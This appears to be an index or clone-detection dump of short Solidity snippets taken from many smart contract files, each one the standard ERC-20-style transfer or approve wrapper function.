    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8f5b2832b8D440cf00B5Ef5a37d12DC9d96F0839.sol" startline="73" endline="76" pcid="5253">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x700ab19C3D9FA23d1A194761eddD9986Aa620293.sol" startline="82" endline="85" pcid="4110">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8f5b2832b8D440cf00B5Ef5a37d12DC9d96F0839.sol" startline="83" endline="86" pcid="5255">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8fE05D10B3c7aE008165Db5FA6a472c25E666A7F.sol" startline="73" endline="76" pcid="5268">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8fE05D10B3c7aE008165Db5FA6a472c25E666A7F.sol" startline="83" endline="86" pcid="5270">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdeE18b2a1ac44f22E4E3Ee3de6AeD146877bCe50.sol" startline="84" endline="87" pcid="7977">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x532b9b8cDdE8fDF33e41bF2aE578fC83D9CF8AC9.sol" startline="74" endline="77" pcid="3089">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x23ffd2f59ec758388282634cda63d6dc1e3120f2.sol" startline="175" endline="178" pcid="1099">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4751AA52a743FFea38c4031e5158AcfA30347f26.sol" startline="69" endline="72" pcid="2689">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0990031433A1C58Ec2A2AFD43154bDD036BA794d.sol" startline="71" endline="74" pcid="278">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe33c37cddb31548856537434d103e57d99242efb.sol" startline="73" endline="76" pcid="8215">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1684f783064B9F4D6273e9ed11F5D753C193E5E5.sol" startline="74" endline="77" pcid="680">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x78102a37f04eb263c1f626702f1c1f98618ea3de.sol" startline="183" endline="186" pcid="4510">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa724ad0C59f178C3d291081b8aE06d3d23Eb5383.sol" startline="80" endline="83" pcid="6122">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb5c5017c98549049c1d1Cf46e3d0eA7882a21B33.sol" startline="74" endline="77" pcid="6612">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x492615CB4660943C014ee5950b9375912fF683B8.sol" startline="71" endline="74" pcid="2751">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb5c5017c98549049c1d1Cf46e3d0eA7882a21B33.sol" startline="84" endline="87" pcid="6614">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x23ffd2f59ec758388282634cda63d6dc1e3120f2.sol" startline="146" endline="149" pcid="1094">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0D6a0b9A0989D9126953C5a4aE4aA5300f6535f1.sol" startline="80" endline="83" pcid="363">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x78102a37f04eb263c1f626702f1c1f98618ea3de.sol" startline="146" endline="149" pcid="4504">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa724ad0C59f178C3d291081b8aE06d3d23Eb5383.sol" startline="70" endline="73" pcid="6120">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb628B6198E2320437e8a9FF1e72A9FF3f1636cf9.sol" startline="77" endline="80" pcid="6629">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb628B6198E2320437e8a9FF1e72A9FF3f1636cf9.sol" startline="87" endline="90" pcid="6631">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd1a932685B4e94E152589C0f264a851812f25724.sol" startline="72" endline="75" pcid="7458">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x398Fa4bd97036EB7cF85E84FbDe34959b4E4C396.sol" startline="74" endline="77" pcid="1915">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5C1f1986b0cD5EF29A7528f59DC0dC03060dE44E.sol" startline="77" endline="80" pcid="3532">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x249f6849814bfaeda890588e404030eccdefb1c6.sol" startline="81" endline="84" pcid="1134">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf84335126a90025bd4eb3dd43a1aa6a906d6739b.sol" startline="28" endline="31" pcid="9030">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE8EE7f2c7e487F6Cf4424FE4589a37883986c402.sol" startline="85" endline="88" pcid="8412">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x77b3e393d8BC4ee7a6d0afff7eDeE5c449E61852.sol" startline="82" endline="85" pcid="4494">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB656d138e4C030064A7aA8d83Aa929928A730c10.sol" startline="74" endline="77" pcid="6644">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x77b3e393d8BC4ee7a6d0afff7eDeE5c449E61852.sol" startline="72" endline="75" pcid="4492">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x60871C6c7c923B61f77C2df7AB15879239FeD83F.sol" startline="83" endline="86" pcid="3670">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8e828c6761A342fa4204d8827A8b81B35904471B.sol" startline="82" endline="85" pcid="5219">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5ad359AaC713929412c9b802175A9f12E5cf9306.sol" startline="71" endline="74" pcid="3457">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x13aa62cE2b990807c069d04A61E8475c45a150E5.sol" startline="72" endline="75" pcid="519">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf448f730a7d85678497BE0E4B939D197763A5460.sol" startline="71" endline="74" pcid="8897">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB656d138e4C030064A7aA8d83Aa929928A730c10.sol" startline="84" endline="87" pcid="6646">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb6a9c0b053c8837e2616fc5aaff1886d03fd7065.sol" startline="25" endline="28" pcid="6652">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe10f1b5466b361c9c8c735021A6d00CDea855763.sol" startline="83" endline="86" pcid="8094">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc4763759BDa9657Cfd06a1613Fc828afD74b70Fa.sol" startline="84" endline="87" pcid="7070">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb6a9c0b053c8837e2616fc5aaff1886d03fd7065.sol" startline="30" endline="33" pcid="6653">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE8EE7f2c7e487F6Cf4424FE4589a37883986c402.sol" startline="75" endline="78" pcid="8410">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x68f05bd71E466CA3C1CCC626590DF0Dca75b91Ba.sol" startline="80" endline="83" pcid="3887">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x15fD6fad37E54f3B9fFcf3B1c4A817987Bc54EB5.sol" startline="71" endline="74" pcid="665">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2362dE6A331ca1f0f5243CE99792dbEdab68D184.sol" startline="85" endline="88" pcid="1068">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb07F1e635FbA15234B11A351Ee03Da67D11111B2.sol" startline="85" endline="88" pcid="6504">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe928e115184bad954b11c477df5e1fc94f04e45d.sol" startline="82" endline="85" pcid="8427">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb07F1e635FbA15234B11A351Ee03Da67D11111B2.sol" startline="75" endline="78" pcid="6502">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x398Fa4bd97036EB7cF85E84FbDe34959b4E4C396.sol" startline="84" endline="87" pcid="1917">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x019A98258bd5dE47900a0be227087af81Eaf4c69.sol" startline="76" endline="79" pcid="52">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xFB1eef96272C53D608d11de7a92B1e7a0abF7DFc.sol" startline="85" endline="88" pcid="9132">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf84335126a90025bd4eb3dd43a1aa6a906d6739b.sol" startline="33" endline="36" pcid="9031">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa33ced472a9b6dd99abc6bae53d4a905832e02cf.sol" startline="83" endline="86" pcid="5913">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3D0F6fAF8Ed7c849742861D7C9C7F0Bc1E7Fd116.sol" startline="73" endline="76" pcid="2185">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x445e4AEE9f66Fc3c4a68EBD67B2329Ff5ba5EcDc.sol" startline="82" endline="85" pcid="2543">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5ba66281ec78ee1a83e7a449d1692b0fda7023e2.sol" startline="59" endline="62" pcid="3500">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x700ab19C3D9FA23d1A194761eddD9986Aa620293.sol" startline="72" endline="75" pcid="4108">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xF92050985936150572FCA5d8307bfd35771CDB54.sol" startline="67" endline="70" pcid="9076">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xeC7593A6254CE83FA3545B1F44EcDf6C6b85848b.sol" startline="69" endline="72" pcid="8615">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x02ab29a17d2a8446af2559ff31bdee27ae3dd944.sol" startline="34" endline="37" pcid="105">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa33ced472a9b6dd99abc6bae53d4a905832e02cf.sol" startline="73" endline="76" pcid="5911">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD53bd4D2a303F2D046C94C3553d0a34E903a9Afb.sol" startline="70" endline="73" pcid="7622">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x445e4AEE9f66Fc3c4a68EBD67B2329Ff5ba5EcDc.sol" startline="72" endline="75" pcid="2541">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2AE6bAa928cFeD647807104d4de73aA779a8f433.sol" startline="72" endline="75" pcid="1280">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb0549cac8a2bf3f5d65e5d7b713f33a9eaca6768.sol" startline="86" endline="89" pcid="6486">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5B8048664dB0A24b6372Cab5972baE9F40c6012e.sol" startline="81" endline="84" pcid="3474">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x50F33884A82D799A14bEF3636523e6E9c761D9DD.sol" startline="82" endline="85" pcid="3009">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb0549cac8a2bf3f5d65e5d7b713f33a9eaca6768.sol" startline="73" endline="76" pcid="6484">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfBB3b5DF228ded41b9450C535Cd115707c6456C1.sol" startline="80" endline="83" pcid="9180">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xCE641a63a438f15A3929C0A66b1428448ccfFaae.sol" startline="86" endline="89" pcid="7344">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdea8f0f40066bbc20c044729f08d3c488e4603d8.sol" startline="72" endline="75" pcid="7960">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xeC7593A6254CE83FA3545B1F44EcDf6C6b85848b.sol" startline="79" endline="82" pcid="8617">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa71Cbe77C505140Cd10070401b82580E0Fe94a1B.sol" startline="87" endline="90" pcid="6107">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdf2b11D6589a98Cf77e8e91B78cE8f2beB3dcbf5.sol" startline="69" endline="72" pcid="8005">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x24EdaAAdB4EA4C7aa6CAe4dBB0D0a93C8F5FF180.sol" startline="70" endline="73" pcid="1147">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0fa38D4bdf91c5C3E4FB66D0125748aA0897683e.sol" startline="82" endline="85" pcid="421">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa71Cbe77C505140Cd10070401b82580E0Fe94a1B.sol" startline="77" endline="80" pcid="6105">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd1a932685B4e94E152589C0f264a851812f25724.sol" startline="82" endline="85" pcid="7460">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x55D55083c478237062763c41CBd20209841a0459.sol" startline="83" endline="86" pcid="3211">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x70d8b31f4eeE0E9988D0b196531205A9D30Ad104.sol" startline="84" endline="87" pcid="4158">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xea0C5622A2E88392b1edb53e495a28491aC11fBA.sol" startline="86" endline="89" pcid="8472">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x24EdaAAdB4EA4C7aa6CAe4dBB0D0a93C8F5FF180.sol" startline="80" endline="83" pcid="1149">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8227de806a54ce72c23fab6f175d80d688536d7a.sol" startline="71" endline="74" pcid="4873">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5B8048664dB0A24b6372Cab5972baE9F40c6012e.sol" startline="71" endline="74" pcid="3472">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3ce7CAfDEB197967161757d8a44e60e9Bf58bC10.sol" startline="72" endline="75" pcid="2170">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x32eC423819A8C80CC7B609C20961371e75E54FA0.sol" startline="84" endline="87" pcid="1584">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xCE641a63a438f15A3929C0A66b1428448ccfFaae.sol" startline="76" endline="79" pcid="7342">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8e828c6761A342fa4204d8827A8b81B35904471B.sol" startline="72" endline="75" pcid="5217">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3c9176ca5edd24a65e938e37729e717a3776ed06.sol" startline="79" endline="82" pcid="2150">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9074b21AB3452ABC15F7e15B6b7233EBe9Ed731f.sol" startline="398" endline="401" pcid="5283">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd0cD86CA2768C13980fE496ca78bC72Ed8f2bE8B.sol" startline="84" endline="87" pcid="7445">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x532b9b8cDdE8fDF33e41bF2aE578fC83D9CF8AC9.sol" startline="84" endline="87" pcid="3091">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x729841D06c8D569c8Dc118d9f6a5c663583d709F.sol" startline="84" endline="87" pcid="4213">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x76F7c76B8bcb64CEBcDCd6eE7D9eA3F4A4203CF8.sol" startline="86" endline="89" pcid="4479">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xefb888BC43e9BC7cA5312fBae0CD394Cf1A27af6.sol" startline="74" endline="77" pcid="8753">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xDc41DbF96D3641d64D46C2a9D805B2a7eA804438.sol" startline="70" endline="73" pcid="7820">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0D6a0b9A0989D9126953C5a4aE4aA5300f6535f1.sol" startline="70" endline="73" pcid="361">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3943a56c7b1efd43c3c952aec05cb295f0ab8c67.sol" startline="68" endline="71" pcid="1900">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x24F678d0E7E6Cf58d7aB828e13E7DE2EF15cDb60.sol" startline="71" endline="74" pcid="1162">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8227de806a54ce72c23fab6f175d80d688536d7a.sol" startline="81" endline="84" pcid="4875">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe0292d64ff7319abd8083e2bdae5ba81a56ada05.sol" startline="67" endline="70" pcid="8050">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x075D3f6AcC15Caf4F8699D72Bc760A09f5842C3f.sol" startline="84" endline="87" pcid="193">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd85C9321Bdb4D2Ff3b0De51fd17E71E9d64a0dA4.sol" startline="79" endline="82" pcid="7746">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x76F7c76B8bcb64CEBcDCd6eE7D9eA3F4A4203CF8.sol" startline="76" endline="79" pcid="4477">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2AE6bAa928cFeD647807104d4de73aA779a8f433.sol" startline="82" endline="85" pcid="1282">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb7844372AB08A7EBA9D3cA79ccDe3F22C990b1E5.sol" startline="74" endline="77" pcid="6671">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6cEbef0D2a75E294aEdb3641e77F63CF3ebabb8B.sol" startline="80" endline="83" pcid="3989">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x67d726579cdb18830da61472da171f56028b0df1.sol" startline="64" endline="67" pcid="3854">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6e45ced3238f28085a8a9e8d93e273013ad9d5a4.sol" startline="70" endline="73" pcid="4047">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa342B0b37B2a6e213c61B1f19b53dFD3dF82ED53.sol" startline="71" endline="74" pcid="5926">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9074b21AB3452ABC15F7e15B6b7233EBe9Ed731f.sol" startline="408" endline="411" pcid="5285">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfbefc1a66fa6c6fe5107942e12fa981e378b1791.sol" startline="80" endline="83" pcid="9195">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe10f1b5466b361c9c8c735021A6d00CDea855763.sol" startline="73" endline="76" pcid="8092">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x32eC423819A8C80CC7B609C20961371e75E54FA0.sol" startline="74" endline="77" pcid="1582">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x341F7b39D375195870915b0744c90D3c6459EEdd.sol" startline="71" endline="74" pcid="1612">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8Dfec76a1104A22faAD1c7Ba7A90d9508e3eF5a7.sol" startline="80" endline="83" pcid="5204">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x55D55083c478237062763c41CBd20209841a0459.sol" startline="73" endline="76" pcid="3209">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x408480574c803D05a0244b479c5020a97f546c51.sol" startline="71" endline="74" pcid="2375">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb7844372AB08A7EBA9D3cA79ccDe3F22C990b1E5.sol" startline="84" endline="87" pcid="6673">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xafC5AE8b1149E8b488Ef254c4Ee4FcfA4c3eE124.sol" startline="82" endline="85" pcid="6429">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8Dfec76a1104A22faAD1c7Ba7A90d9508e3eF5a7.sol" startline="70" endline="73" pcid="5202">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x91448BdD0ef6810de6E4a8B3Ba82590ab70D5b95.sol" startline="73" endline="76" pcid="5319">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4c143f140ee6C2E0c0f6125b3133DC67C9D95856.sol" startline="73" endline="76" pcid="2853">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x91448BdD0ef6810de6E4a8B3Ba82590ab70D5b95.sol" startline="83" endline="86" pcid="5321">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2362dE6A331ca1f0f5243CE99792dbEdab68D184.sol" startline="75" endline="78" pcid="1066">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xafC5AE8b1149E8b488Ef254c4Ee4FcfA4c3eE124.sol" startline="72" endline="75" pcid="6427">
